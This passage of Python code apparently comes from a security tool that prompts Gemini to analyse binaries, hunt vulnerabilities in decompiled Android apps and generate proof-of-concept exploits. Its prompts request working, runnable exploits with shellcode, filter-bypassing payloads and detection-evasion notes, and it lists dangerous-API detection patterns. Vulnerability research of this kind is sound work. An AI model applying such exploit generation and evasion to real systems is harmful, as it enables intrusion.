    "file_operations": {{
        "creates_files": true/false,
        "modifies_files": true/false,
        "deletes_files": true/false,
        "targets": ["Types of files it operates on"]
    }},
    "process_operations": {{
        "spawns_processes": true/false,
        "injects_code": true/false,
        "purposes": ["What process operations are for"]
    }},
    "crypto_usage": {{
        "uses_crypto": true/false,
        "algorithms": ["Algorithms used"],
        "purposes": ["What crypto is used for"]
    }},
    "ui_type": "console|gui|service|library|unknown",
    "confidence": 0.85,
    "analysis_notes": ["Additional observations about the binary"]
}}"""

    response = await gemini_request_with_retry(
        lambda: client.aio.models.generate_content(
            model=settings.gemini_model_id,
            contents=[types.Content(role="user", parts=[types.Part(text=analysis_context)])],
        ),
        max_retries=3,
        base_delay=2.0,
        timeout_seconds=120.0,
        operation_name="Binary purpose analysis"
    )
    
    if not response:
        raise ValueError("AI analysis failed - no response")
    
    # Parse AI response
    try:
        result_text = response.text.strip()
        if "```json" in result_text:
            result_text = result_text.split("```json")[1].split("```")[0]
        elif "```" in result_text:
            result_text = result_text.split("```")[1].split("```")[0]
        
        ai_result = json.loads(result_text)
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse AI response: {e}")
        # Fallback response
        ai_result = {
            "purpose_summary": f"Binary analysis for {file_path.name}",
            "detailed_description": "Unable to determine detailed purpose from AI analysis.",
            "category": "unknown",
            "functionality": list(categorized_apis.keys()),
            "suspicious_behaviors": [],
            "data_handling": {"reads": [], "writes": [], "stores": []},
            "network_activity": {"has_network": bool(categorized_apis.get("network")), "protocols": [], "purposes": []},
            "file_operations": {"creates_files": False, "modifies_files": False, "deletes_files": False, "targets": []},
            "process_operations": {"spawns_processes": False, "injects_code": False, "purposes": []},
            "crypto_usage": {"uses_crypto": bool(categorized_apis.get("crypto")), "algorithms": [], "purposes": []},
            "ui_type": "unknown",
            "confidence": 0.3,
            "analysis_notes": ["AI analysis parsing failed, using basic heuristics"],
        }
    
    await report_progress("complete", 100, "Analysis complete")
    
    return BinaryPurposeAnalysis(
        filename=file_path.name,
        purpose_summary=ai_result.get("purpose_summary", ""),
        detailed_description=ai_result.get("detailed_description", ""),
        category=ai_result.get("category", "unknown"),
        functionality=ai_result.get("functionality", []),
        capabilities={
            "file_system": categorized_apis.get("file_system", []),
            "network": categorized_apis.get("network", []),
            "process": categorized_apis.get("process", []),
            "crypto": categorized_apis.get("crypto", []),
            "gui": categorized_apis.get("gui", []),
        },
        api_usage=categorized_apis,
        suspicious_behaviors=ai_result.get("suspicious_behaviors", []),
        data_handling=ai_result.get("data_handling", {}),
        network_activity=ai_result.get("network_activity", {}),
        file_operations=ai_result.get("file_operations", {}),
        process_operations=ai_result.get("process_operations", {}),
        crypto_usage=ai_result.get("crypto_usage", {}),
        ui_type=ai_result.get("ui_type", "unknown"),
        confidence=ai_result.get("confidence", 0.5),
        analysis_notes=ai_result.get("analysis_notes", []),
    )


def binary_purpose_to_dict(analysis: BinaryPurposeAnalysis) -> Dict[str, Any]:
    """Convert BinaryPurposeAnalysis to JSON-serializable dict."""
    return {
        "filename": analysis.filename,
        "purpose_summary": analysis.purpose_summary,
        "detailed_description": analysis.detailed_description,
        "category": analysis.category,
        "functionality": analysis.functionality,
        "capabilities": analysis.capabilities,
        "api_usage": analysis.api_usage,
        "suspicious_behaviors": analysis.suspicious_behaviors,
        "data_handling": analysis.data_handling,
        "network_activity": analysis.network_activity,
        "file_operations": analysis.file_operations,
        "process_operations": analysis.process_operations,
        "crypto_usage": analysis.crypto_usage,
        "ui_type": analysis.ui_type,
        "confidence": analysis.confidence,
        "analysis_notes": analysis.analysis_notes,
    }


# ============================================================================
# Proof-of-Concept Exploit Generation
# ============================================================================

@dataclass
class PoCExploit:
    """A proof-of-concept exploit for a vulnerability."""
    vuln_id: str
    vuln_title: str
    exploit_type: str  # "python", "c", "shellcode", "payload", "script"
    language: str  # "python", "c", "assembly", "bash", "powershell"
    code: str  # The actual exploit code
    description: str  # What the exploit does
    prerequisites: List[str]  # Required conditions/tools
    usage_instructions: str  # How to run the exploit
    expected_outcome: str  # What happens on success
    limitations: List[str]  # Known limitations
    safety_notes: List[str]  # Important safety/legal warnings
    tested_on: str  # Target environment/version
    reliability: str  # "low", "medium", "high"
    evasion_notes: List[str]  # Detection avoidance techniques


@dataclass
class PoCGenerationResult:
    """Result of PoC generation for one or more vulnerabilities."""
    success: bool
    exploits: List[PoCExploit]
    generation_log: List[str]
    warnings: List[str]
    disclaimer: str


async def generate_poc_exploit(
    vulnerability: Dict[str, Any],
    target_platform: str = "linux",
    exploit_style: str = "python",
    include_shellcode: bool = False,
    progress_callback: Optional[Any] = None,
) -> PoCExploit:
    """
    Generate a proof-of-concept exploit for a vulnerability.
    
    Args:
        vulnerability: The vulnerability finding dict
        target_platform: Target platform (linux, windows, both)
        exploit_style: Preferred exploit language (python, c, shellcode)
        include_shellcode: Whether to include raw shellcode
        progress_callback: Optional callback for progress updates
        
    Returns:
        PoCExploit with the generated exploit code
    """
    from google import genai
    from google.genai import types
    
    client = genai.Client(api_key=settings.gemini_api_key)
    
    async def report_progress(pct: int, msg: str):
        if progress_callback:
            await progress_callback(pct, msg)
    
    await report_progress(0, "Generating proof-of-concept exploit...")
    
    # Map vulnerability category to exploit template type
    category = vulnerability.get("category", "buffer_overflow")
    severity = vulnerability.get("severity", "medium")
    function_name = vulnerability.get("function_name", "unknown")
    code_snippet = vulnerability.get("code_snippet", "")
    technical_details = vulnerability.get("technical_details", "")
    
    # Build exploit generation prompt
    exploit_prompt = f"""Generate a working proof-of-concept exploit for this vulnerability.

## Vulnerability Details
- Title: {vulnerability.get("title", "Unknown Vulnerability")}
- Severity: {severity}
- Category: {category}
- Function: {function_name}
- CWE: {vulnerability.get("cwe_id", "N/A")}
- CVSS: {vulnerability.get("cvss_estimate", 5.0)}

## Technical Details
{technical_details}

## Vulnerable Code
```
{code_snippet[:3000]}
```

## Original PoC Concept
{vulnerability.get("proof_of_concept", "Not provided")}

## Requirements
- Target Platform: {target_platform}
- Preferred Language: {exploit_style}
- Include Shellcode: {include_shellcode}

## Exploit Type Guidelines by Category:

**Buffer Overflow ({category == "buffer_overflow"}):**
- Generate payload that overflows the buffer
- Include payload generation for common architectures
- Consider stack canaries, ASLR, NX if relevant

**Format String ({category == "format_string"}):**
- Generate format string payload
- Include %n writes for arbitrary write
- Show address leak technique

**Use-After-Free ({category == "use_after_free"}):**
- Show allocation/free/use sequence
- Include heap manipulation if needed

**Command Injection ({category == "command_injection"}):**
- Generate payload with shell commands
- Show input that bypasses filtering

**Integer Overflow ({category == "integer_overflow"}):**
- Show values that cause overflow
- Demonstrate resulting buffer issue

**Path Traversal ({category == "path_traversal"}):**
- Generate path traversal sequences
- Show file access bypass

Generate a complete, working exploit. Return JSON:
{{
    "exploit_type": "{exploit_style}",
    "language": "{exploit_style}",
    "code": "COMPLETE EXPLOIT CODE HERE - fully working, well-commented",
    "description": "What this exploit does and how",
    "prerequisites": ["Required tools/conditions"],
    "usage_instructions": "Step-by-step how to run this exploit",
    "expected_outcome": "What happens on successful exploitation",
    "limitations": ["Known limitations of this PoC"],
    "safety_notes": ["IMPORTANT safety/legal warnings"],
    "tested_on": "Target environment this was designed for",
    "reliability": "low|medium|high",
    "evasion_notes": ["Notes on avoiding detection if relevant"]
}}

IMPORTANT:
1. Generate REAL, WORKING exploit code - not pseudocode
2. Include proper error handling
3. Add helpful comments explaining each step
4. Make it educational and well-documented
5. Include safety checks where appropriate
6. The code should be copy-pasteable and runnable"""

    await report_progress(30, "AI generating exploit code...")
    
    response = await gemini_request_with_retry(
        lambda: client.aio.models.generate_content(
            model=settings.gemini_model_id,
            contents=[types.Content(role="user", parts=[types.Part(text=exploit_prompt)])],
        ),
        max_retries=3,
        base_delay=2.0,
        timeout_seconds=180.0,
        operation_name="PoC exploit generation"
    )
    
    if not response:
        raise ValueError("Failed to generate exploit - no AI response")
    
    await report_progress(70, "Parsing exploit...")
    
    try:
        result_text = response.text.strip()
        if "```json" in result_text:
            result_text = result_text.split("```json")[1].split("```")[0]
        elif "```" in result_text:
            # Find the JSON block
            parts = result_text.split("```")
            for part in parts:
                if part.strip().startswith("{"):
                    result_text = part
                    break
        
        exploit_data = json.loads(result_text)
    except json.JSONDecodeError:
        # Try to extract just the code
        logger.warning("Failed to parse exploit JSON, extracting code directly")
        exploit_data = {
            "exploit_type": exploit_style,
            "language": exploit_style,
            "code": response.text,
            "description": f"PoC exploit for {vulnerability.get('title', 'vulnerability')}",
            "prerequisites": ["Python 3.x" if exploit_style == "python" else "GCC/Clang"],
            "usage_instructions": "Review and adapt the code for your target",
            "expected_outcome": "Demonstrates the vulnerability",
            "limitations": ["May require adaptation for specific targets"],
            "safety_notes": ["FOR AUTHORIZED TESTING ONLY"],
            "tested_on": target_platform,
            "reliability": "medium",
            "evasion_notes": [],
        }
    
    await report_progress(100, "Exploit generated")
    
    return PoCExploit(
        vuln_id=vulnerability.get("id", str(uuid.uuid4())),
        vuln_title=vulnerability.get("title", "Unknown"),
        exploit_type=exploit_data.get("exploit_type", exploit_style),
        language=exploit_data.get("language", exploit_style),
        code=exploit_data.get("code", ""),
        description=exploit_data.get("description", ""),
        prerequisites=exploit_data.get("prerequisites", []),
        usage_instructions=exploit_data.get("usage_instructions", ""),
        expected_outcome=exploit_data.get("expected_outcome", ""),
        limitations=exploit_data.get("limitations", []),
        safety_notes=exploit_data.get("safety_notes", ["FOR AUTHORIZED TESTING ONLY"]),
        tested_on=exploit_data.get("tested_on", target_platform),
        reliability=exploit_data.get("reliability", "medium"),
        evasion_notes=exploit_data.get("evasion_notes", []),
    )


async def generate_multiple_pocs(
    vulnerabilities: List[Dict[str, Any]],
    target_platform: str = "linux",
    exploit_style: str = "python",
    progress_callback: Optional[Any] = None,
) -> PoCGenerationResult:
    """
    Generate PoC exploits for multiple vulnerabilities.
    
    Args:
        vulnerabilities: List of vulnerability findings
        target_platform: Target platform
        exploit_style: Preferred exploit language
        progress_callback: Optional callback for progress
        
    Returns:
        PoCGenerationResult with all generated exploits
    """
    exploits = []
    generation_log = []
    warnings = []
    
    total = len(vulnerabilities)
    
    for idx, vuln in enumerate(vulnerabilities):
        try:
            async def progress_wrapper(pct: int, msg: str):
                if progress_callback:
                    overall_pct = int((idx / total) * 100 + (pct / total))
                    await progress_callback(overall_pct, f"[{idx+1}/{total}] {msg}")
            
            generation_log.append(f"Generating PoC for: {vuln.get('title', 'Unknown')}")
            
            exploit = await generate_poc_exploit(
                vulnerability=vuln,
                target_platform=target_platform,
                exploit_style=exploit_style,
                progress_callback=progress_wrapper,
            )
            exploits.append(exploit)
            generation_log.append(f" Successfully generated: {exploit.vuln_title}")
            
        except Exception as e:
            error_msg = f" Failed to generate PoC for {vuln.get('title', 'Unknown')}: {str(e)}"
            generation_log.append(error_msg)
            warnings.append(error_msg)
            logger.warning(error_msg)
    
    return PoCGenerationResult(
        success=len(exploits) > 0,
        exploits=exploits,
        generation_log=generation_log,
        warnings=warnings,
        disclaimer="""
IMPORTANT DISCLAIMER:
These proof-of-concept exploits are provided for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use of these exploits against systems you do not own or have explicit 
permission to test is ILLEGAL and may violate computer crime laws.

The generated exploits are for educational and defensive purposes:
- Understanding how vulnerabilities can be exploited
- Testing your own systems and applications
- Developing patches and mitigations

USE RESPONSIBLY AND LEGALLY.
""".strip(),
    )


def poc_exploit_to_dict(exploit: PoCExploit) -> Dict[str, Any]:
    """Convert PoCExploit to JSON-serializable dict."""
    return {
        "vuln_id": exploit.vuln_id,
        "vuln_title": exploit.vuln_title,
        "exploit_type": exploit.exploit_type,
        "language": exploit.language,
        "code": exploit.code,
        "description": exploit.description,
        "prerequisites": exploit.prerequisites,
        "usage_instructions": exploit.usage_instructions,
        "expected_outcome": exploit.expected_outcome,
        "limitations": exploit.limitations,
        "safety_notes": exploit.safety_notes,
        "tested_on": exploit.tested_on,
        "reliability": exploit.reliability,
        "evasion_notes": exploit.evasion_notes,
    }


def poc_result_to_dict(result: PoCGenerationResult) -> Dict[str, Any]:
    """Convert PoCGenerationResult to JSON-serializable dict."""
    return {
        "success": result.success,
        "exploits": [poc_exploit_to_dict(e) for e in result.exploits],
        "generation_log": result.generation_log,
        "warnings": result.warnings,
        "disclaimer": result.disclaimer,
    }


# ============================================================================
# Multi-Pass AI Vulnerability Hunt for Java/Android Code
# ============================================================================

# Vulnerability categories for Java/Android analysis
JAVA_VULN_HUNT_CATEGORIES = {
    "injection": {
        "description": "SQL, Command, LDAP, XPath injection vulnerabilities",
        "cwe": "CWE-89",
        "dangerous_patterns": [
            "rawQuery", "execSQL", "query", "Runtime.exec", "ProcessBuilder",
            "executeUpdate", "executeQuery", "createQuery", "createNativeQuery"
        ],
    },
    "xss": {
        "description": "Cross-site scripting in WebViews and HTML generation",
        "cwe": "CWE-79",
        "dangerous_patterns": [
            "loadUrl", "loadData", "loadDataWithBaseURL", "evaluateJavascript",
            "addJavascriptInterface", "setJavaScriptEnabled"
        ],
    },
    "crypto": {
        "description": "Weak cryptography, insecure random, hardcoded keys",
        "cwe": "CWE-327",
        "dangerous_patterns": [
            "SecretKeySpec", "Cipher.getInstance", "MessageDigest", "SecureRandom",
            "DES", "MD5", "SHA1", "ECB", "NoPadding"
        ],
    },
    "file_access": {
        "description": "Path traversal, insecure file operations",
        "cwe": "CWE-22",
        "dangerous_patterns": [
            "FileInputStream", "FileOutputStream", "openFileInput", "openFileOutput",
            "getExternalFilesDir", "MODE_WORLD_READABLE", "MODE_WORLD_WRITEABLE"
        ],
    },
    "authentication": {
        "description": "Weak authentication, insecure credential storage",
        "cwe": "CWE-287",
        "dangerous_patterns": [
            "SharedPreferences", "getSharedPreferences", "putString",
            "KeyStore", "checkPassword", "validateToken"
        ],
    },
    "intent_security": {
        "description": "Intent injection, exported component vulnerabilities",
        "cwe": "CWE-940",
        "dangerous_patterns": [
            "getIntent", "getExtras", "getStringExtra", "getParcelableExtra",
            "startActivity", "sendBroadcast", "PendingIntent"
        ],
    },
    "ssl_tls": {
        "description": "SSL/TLS vulnerabilities, certificate validation bypass",
        "cwe": "CWE-295",
        "dangerous_patterns": [
            "TrustManager", "HostnameVerifier", "SSLSocketFactory",
            "checkServerTrusted", "ALLOW_ALL_HOSTNAME_VERIFIER"
        ],
    },
    "logging": {
        "description": "Sensitive data exposure through logging",
        "cwe": "CWE-532",
        "dangerous_patterns": [
            "Log.d", "Log.v", "Log.i", "Log.e", "Log.w",
            "System.out.println", "printStackTrace"
        ],
    },
}


async def ai_vulnerability_hunt_java(
    sources_dir: Path,
    package_name: str,
    existing_findings: Optional[List[Dict]] = None,
    max_passes: int = 3,
    max_targets_per_pass: int = 20,
    on_progress: callable = None,
) -> Dict[str, Any]:
    """
    Perform autonomous multi-pass AI-guided vulnerability hunting on Java/Android source code.
    
    Pass 1: Identify attack surface from code patterns
    Pass 2: AI triages high-priority targets
    Pass 3+: Deep analysis of specific methods for vulnerabilities
    
    Args:
        sources_dir: Path to JADX sources directory
        package_name: Android package name
        existing_findings: Already discovered vulnerabilities from pattern scanning
        max_passes: Maximum number of analysis passes
        max_targets_per_pass: Max methods to analyze per pass
        on_progress: Progress callback
    
    Returns:
        Dictionary with vulnerabilities, targets, and hunting log
    """
    import time
    from google import genai
    from google.genai import types
    
    if not settings.gemini_api_key:
        logger.warning("Gemini API key not configured - skipping Java vuln hunt")
        return None
    
    hunting_log = []
    targets = []
    vulnerabilities = []
    manifest_context = ""
    
    def log_event(event_type: str, message: str, details: Dict = None):
        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "type": event_type,
            "message": message,
            "details": details or {},
        }
        hunting_log.append(entry)
        logger.info(f"[JavaVulnHunt] {event_type}: {message}")
    
    try:
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # ====================================================================
        # PRE-PASS: Parse AndroidManifest for app structure context
        # ====================================================================
        manifest_path = sources_dir / "AndroidManifest.xml"
        exported_components = []
        permissions = []
        if manifest_path.exists():
            try:
                manifest_content = manifest_path.read_text(encoding='utf-8', errors='ignore')
                import re
                
                # Extract exported components (activities, services, receivers, providers)
                exported_pattern = r'<(activity|service|receiver|provider)[^>]*android:name="([^"]+)"[^>]*android:exported="true"'
                exported_matches = re.findall(exported_pattern, manifest_content)
                for comp_type, comp_name in exported_matches:
                    exported_components.append({"type": comp_type, "name": comp_name})
                
                # Extract components with intent-filters (implicitly exported)
                intent_filter_pattern = r'<(activity|service|receiver)[^>]*android:name="([^"]+)"[^>]*>[\s\S]*?<intent-filter'
                intent_matches = re.findall(intent_filter_pattern, manifest_content)
                for comp_type, comp_name in intent_matches:
                    if {"type": comp_type, "name": comp_name} not in exported_components:
                        exported_components.append({"type": comp_type, "name": comp_name, "has_intent_filter": True})
                
                # Extract dangerous permissions
                perm_pattern = r'<uses-permission[^>]*android:name="([^"]+)"'
                permissions = re.findall(perm_pattern, manifest_content)
                dangerous_perms = [p for p in permissions if any(d in p.lower() for d in [
                    'internet', 'write_external', 'read_external', 'camera', 'location',
                    'contacts', 'sms', 'call_log', 'record_audio', 'read_phone'
                ])]
                
                manifest_context = f"""
## AndroidManifest Analysis
- Exported Components: {len(exported_components)} (attack surface entry points)
- Components: {json.dumps(exported_components[:20], indent=2)}
- Dangerous Permissions: {dangerous_perms[:15]}
"""
                log_event("manifest_parsed", f"Found {len(exported_components)} exported components, {len(dangerous_perms)} dangerous permissions")
            except Exception as e:
                log_event("manifest_error", f"Failed to parse AndroidManifest: {e}")
        
        # ====================================================================
        # PASS 0: AI Filename Triage - Let AI pick interesting files from names
        # ====================================================================
        log_event("pass_start", "Starting Pass 0: AI Filename Triage")
        
        # Skip library packages
        skip_packages = [
            "androidx/", "android/support/", "com/google/", "kotlin/", "kotlinx/",
            "org/apache/", "com/squareup/", "io/reactivex/", "okhttp3/", "retrofit2/",
            "com/fasterxml/", "org/json/", "com/bumptech/", "dagger/", "javax/",
            "org/bouncycastle/", "org/slf4j/", "com/android/", "org/chromium/"
        ]
        
        # Collect all Java files
        java_files = list(sources_dir.rglob("*.java"))
        app_files = []
        app_file_paths = []
        for f in java_files:
            rel_path = str(f.relative_to(sources_dir))
            if not any(rel_path.startswith(skip) for skip in skip_packages):
                app_files.append(f)
                app_file_paths.append(rel_path)
        
        log_event("files_found", f"Found {len(app_files)} app source files (skipped {len(java_files) - len(app_files)} library files)")
        
        # AI triage: Send all filenames to AI for intelligent prioritization
        ai_priority_files = set()
        if len(app_file_paths) > 50:  # Only use AI triage for larger codebases
            # Group files by directory for context
            file_list_text = "\n".join(sorted(app_file_paths))
            
            # Include manifest context for better prioritization
            manifest_section = manifest_context if manifest_context else "## AndroidManifest: Not available"
            
            triage_prompt = f"""You are an expert Android security researcher. Below is a list of {len(app_file_paths)} Java source files from a decompiled Android app.

{manifest_section}

YOUR TASK: Identify the files most likely to contain security vulnerabilities.

CRITICAL - PRIORITIZE exported components from AndroidManifest (attack surface entry points):
{json.dumps([c["name"].split(".")[-1] for c in exported_components[:30]], indent=2) if exported_components else "No exported components found"}

ALSO PRIORITIZE files with names suggesting:
1. Authentication/Login (LoginActivity, AuthManager, SessionHandler, TokenValidator)
2. Cryptography (CryptoHelper, AESUtils, EncryptionManager, KeyManager)
3. Network/API (ApiClient, NetworkManager, HttpHelper, RestService, WebViewActivity)
4. Data Storage (DatabaseHelper, SharedPrefsManager, FileUtils, CacheManager)
5. Payment/Billing (PaymentActivity, BillingManager, TransactionHandler)
6. WebView handlers (WebViewActivity, BridgeHandler, JsInterface)
7. Deep links/Intents (DeepLinkHandler, IntentReceiver, SchemeHandler)
8. User data (UserManager, ProfileActivity, AccountHelper)
9. Security configs (SecurityConfig, SSLHelper, CertManager)
10. Admin/Debug (AdminActivity, DebugUtils, TestHelper, DevSettings)

DEPRIORITIZE:
- UI adapters, ViewHolders, Fragments without security logic
- Model/POJO classes (just data containers)
- Generated code (R.java, BuildConfig.java, *_Binding.java)
- Utility classes for UI (ColorUtils, AnimationHelper)

FILE LIST:
{file_list_text}

Return a JSON object with:
{{
  "high_priority": ["path/to/file1.java", "path/to/file2.java", ...],  // Max 200 files - MUST analyze
  "medium_priority": ["path/to/file3.java", ...],  // Max 100 files - Should analyze if time permits
  "reasoning": "Brief explanation of your prioritization"
}}

Return ONLY valid JSON, no other text."""

            try:
                triage_response = await gemini_request_with_retry(
                    lambda: client.aio.models.generate_content(
                        model=settings.gemini_model_id,
                        contents=[types.Content(role="user", parts=[types.Part(text=triage_prompt)])],
                    ),
                    max_retries=2,
                    base_delay=2.0,
                    timeout_seconds=120.0,
                    operation_name="AI Filename Triage"
                )
                
                if triage_response:
                    triage_text = triage_response.text.strip()
                    if "```json" in triage_text:
                        triage_text = triage_text.split("```json")[1].split("```")[0]
                    elif "```" in triage_text:
                        triage_text = triage_text.split("```")[1].split("```")[0]
                    
                    triage_result = json.loads(triage_text)
                    high_priority = triage_result.get("high_priority", [])[:200]
                    medium_priority = triage_result.get("medium_priority", [])[:100]
                    ai_priority_files = set(high_priority + medium_priority)
                    
                    log_event("ai_triage_complete", 
                        f"AI identified {len(high_priority)} high-priority and {len(medium_priority)} medium-priority files",
                        {"reasoning": triage_result.get("reasoning", "")[:200]})
            except Exception as e:
                log_event("ai_triage_error", f"AI filename triage failed: {e}, falling back to pattern scan")
        
        # ====================================================================
        # PASS 1: Pattern scan (prioritizing AI-selected files)
        # ====================================================================
        log_event("pass_start", "Starting Pass 1: Source Code Reconnaissance")
        
        # Sort files: AI-prioritized first, then others
        if ai_priority_files:
            priority_app_files = [f for f in app_files if str(f.relative_to(sources_dir)) in ai_priority_files]
            other_app_files = [f for f in app_files if str(f.relative_to(sources_dir)) not in ai_priority_files]
            scan_order = priority_app_files + other_app_files[:200]  # AI picks + 200 others for broader coverage
            log_event("scan_order", f"Scanning {len(priority_app_files)} AI-prioritized files + {min(200, len(other_app_files))} additional")
        else:
            scan_order = app_files[:500]  # Fallback: scan first 500
        
        # Scan for dangerous patterns
        dangerous_methods = []
        for file_path in scan_order:
            try:
                content = file_path.read_text(encoding='utf-8', errors='ignore')
                rel_path = str(file_path.relative_to(sources_dir))
                class_name = file_path.stem
                
                for category, cat_info in JAVA_VULN_HUNT_CATEGORIES.items():
                    for pattern in cat_info["dangerous_patterns"]:
                        if pattern in content:
                            # Find the method containing this pattern
                            lines = content.split('\n')
                            for i, line in enumerate(lines):
                                if pattern in line:
                                    dangerous_methods.append({
                                        "file": rel_path,
                                        "class": class_name,
                                        "line": i + 1,
                                        "pattern": pattern,
                                        "category": category,
                                        "cwe": cat_info["cwe"],
                                        "code_snippet": line.strip()[:200],
                                    })
            except Exception as e:
                logger.debug(f"Error reading {file_path}: {e}")
        
        log_event("patterns_found", f"Found {len(dangerous_methods)} dangerous pattern usages")
        
        if not dangerous_methods:
            log_event("no_targets", "No dangerous patterns found - skipping AI analysis")
            return {
                "scan_id": str(uuid.uuid4()),
                "total_passes": 1,
                "targets": [],
                "vulnerabilities": [],
                "hunting_log": hunting_log,
            }
        
        # ====================================================================
        # PASS 2: AI Triage to identify high-priority targets
        # ====================================================================
        log_event("pass_start", "Starting Pass 2: AI Triage")
        
        # Group by file for AI analysis
        files_with_issues = {}
        for dm in dangerous_methods:
            file_key = dm["file"]
            if file_key not in files_with_issues:
                files_with_issues[file_key] = []
            files_with_issues[file_key].append(dm)
        
        # Prepare summary for AI - increased from 50 to 100 files for better triage
        triage_summary = []
        for file_path, issues in list(files_with_issues.items())[:100]:
            categories = list(set(i["category"] for i in issues))
            triage_summary.append({
                "file": file_path,
                "class": issues[0]["class"] if issues else "Unknown",
                "issue_count": len(issues),
                "categories": categories,
                "patterns": list(set(i["pattern"] for i in issues))[:15],
                "sample_lines": [i["line"] for i in issues[:8]],
            })
        
        triage_prompt = f"""You are an expert Android security researcher performing automated vulnerability triage.

## Package: {package_name}

## Files with Dangerous Pattern Usage
{json.dumps(triage_summary, indent=2)}

## Existing Findings (already discovered)
{json.dumps([{"title": f.get("title"), "severity": f.get("severity"), "file": f.get("file_path")} for f in (existing_findings or [])[:20]], indent=2)}

## Vulnerability Categories
{json.dumps({k: v["description"] for k, v in JAVA_VULN_HUNT_CATEGORIES.items()}, indent=2)}

## Task
Identify the TOP {max_targets_per_pass} files that are MOST LIKELY to contain exploitable vulnerabilities.

Consider:
1. Files with multiple dangerous patterns from different categories
2. Files handling user input, network data, or sensitive operations
3. Files with patterns suggesting auth/crypto/injection issues
4. Avoid files that seem like standard library wrappers

Return a JSON array with:
- file_path: Path to the file
- priority: 1-10 (10 = highest priority)
- category: Primary vulnerability category
- reason: Brief explanation of why this target is interesting
- attack_hypothesis: What vulnerability you suspect might exist

Return ONLY the JSON array, no other text."""

        triage_response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=triage_prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Java Vuln Hunt Triage"
        )
        
        if not triage_response:
            log_event("error", "AI triage failed - no response")
            return {
                "scan_id": str(uuid.uuid4()),
                "total_passes": 2,
                "targets": [],
                "vulnerabilities": [],
                "hunting_log": hunting_log,
            }
        
        # Parse AI targets
        try:
            triage_text = triage_response.text.strip()
            if "```json" in triage_text:
                triage_text = triage_text.split("```json")[1].split("```")[0]
            elif "```" in triage_text:
                triage_text = triage_text.split("```")[1].split("```")[0]
            
            ai_targets = json.loads(triage_text)
            
            for t in ai_targets[:max_targets_per_pass]:
                targets.append({
                    "file_path": t.get("file_path", ""),
                    "priority": t.get("priority", 5),
                    "category": t.get("category", "unknown"),
                    "reason": t.get("reason", ""),
                    "attack_hypothesis": t.get("attack_hypothesis", ""),
                    "analyzed": False,
                })
            
            log_event("triage_complete", f"AI identified {len(targets)} high-priority targets")
        except Exception as e:
            log_event("error", f"Failed to parse AI triage response: {e}")
        
        # ====================================================================
        # PASS 3+: Deep Analysis of Targets
        # ====================================================================
        # Track total time spent to avoid runaway scans
        hunt_start_time = time.time()
        MAX_HUNT_DURATION = 600  # 10 minute max for entire vuln hunt
        
        for pass_num in range(3, max_passes + 1):
            # Check total time
            elapsed = time.time() - hunt_start_time
            if elapsed > MAX_HUNT_DURATION:
                log_event("timeout", f"Vulnerability hunt reached {MAX_HUNT_DURATION}s limit after {len(vulnerabilities)} findings")
                break
            
            log_event("pass_start", f"Starting Pass {pass_num}: Deep Analysis")
            
            # Get targets not yet analyzed - limit based on remaining time
            remaining_time = MAX_HUNT_DURATION - elapsed
            max_targets_this_pass = min(
                max_targets_per_pass // (pass_num - 1),
                int(remaining_time / 30)  # Assume ~30s per target
            )
            pending_targets = [t for t in targets if not t.get("analyzed")][:max_targets_this_pass]
            
            if not pending_targets:
                log_event("no_pending", "No more targets to analyze")
                break
            
            # Analyze targets in parallel (up to 3 at a time) for speed
            async def analyze_target(target):
                try:
                    target_file = sources_dir / target["file_path"]
                    if not target_file.exists():
                        target["analyzed"] = True
                        return []
                    
                    source_code = target_file.read_text(encoding='utf-8', errors='ignore')
                    
                    # Smart extraction for large files - keep security-relevant sections
                    if len(source_code) > 25000:
                        # Extract methods containing dangerous patterns
                        lines = source_code.split('\n')
                        relevant_sections = []
                        
                        # Security-relevant keywords to look for
                        security_keywords = [
                            'password', 'secret', 'key', 'token', 'auth', 'crypt', 'cipher',
                            'sql', 'query', 'execute', 'inject', 'eval', 'exec', 'command',
                            'webview', 'javascript', 'addJavascriptInterface', 'loadUrl',
                            'SharedPreferences', 'getExtras', 'getIntent', 'startActivity',
                            'certificate', 'trust', 'ssl', 'http', 'socket', 'network',
                            'file', 'path', 'read', 'write', 'delete', 'permission',
                            'Log.', 'printStackTrace', 'debug', 'admin', 'root'
                        ]
                        
                        # Find lines with security keywords and include context
                        for i, line in enumerate(lines):
                            line_lower = line.lower()
                            if any(kw.lower() in line_lower for kw in security_keywords):
                                # Include 10 lines before and 10 lines after
                                start = max(0, i - 10)
                                end = min(len(lines), i + 11)
                                section = '\n'.join(lines[start:end])
                                if section not in relevant_sections:
                                    relevant_sections.append(f"// Lines {start+1}-{end}:\n{section}")
                        
                        if relevant_sections:
                            # Keep first 50 lines (imports/class declaration) + relevant sections
                            header = '\n'.join(lines[:50])
                            extracted = '\n\n// ... [RELEVANT SECTIONS EXTRACTED] ...\n\n'.join(relevant_sections[:30])
                            source_code = f"{header}\n\n// ... [SMART EXTRACTION - SECURITY-RELEVANT SECTIONS] ...\n\n{extracted}"
                            if len(source_code) > 30000:
                                source_code = source_code[:30000] + "\n// ... [TRUNCATED]"
                        else:
                            source_code = source_code[:25000] + "\n// ... [FILE TRUNCATED - NO SECURITY KEYWORDS FOUND]"
                    elif len(source_code) > 20000:
                        source_code = source_code[:20000] + "\n// ... [FILE TRUNCATED]"
                    
                    analysis_prompt = f"""You are an expert Android/Java security auditor. Analyze this source code for exploitable vulnerabilities.

## File: {target["file_path"]}
## Package: {package_name}
## Suspected Category: {target["category"]}
## Attack Hypothesis: {target["attack_hypothesis"]}

## Source Code
```java
{source_code}
```

## Task
Perform deep security analysis and identify ALL exploitable vulnerabilities.

For EACH vulnerability found, provide:
1. **title**: Clear vulnerability title
2. **severity**: critical/high/medium/low
3. **category**: Vulnerability category
4. **cwe**: CWE identifier
5. **description**: Detailed description of the vulnerability
6. **affected_code**: The vulnerable code snippet (exact lines)
7. **line_number**: Line number where vulnerability exists
8. **exploitation_steps**: Step-by-step exploitation guide
9. **proof_of_concept**: Code/payload to demonstrate the vulnerability
10. **remediation**: How to fix the vulnerability
11. **confidence**: 1-10 how confident you are this is exploitable

Focus on:
- SQL injection, command injection
- XSS in WebViews
- Insecure cryptography
- Path traversal
- Intent injection
- Hardcoded secrets
- SSL/TLS bypass
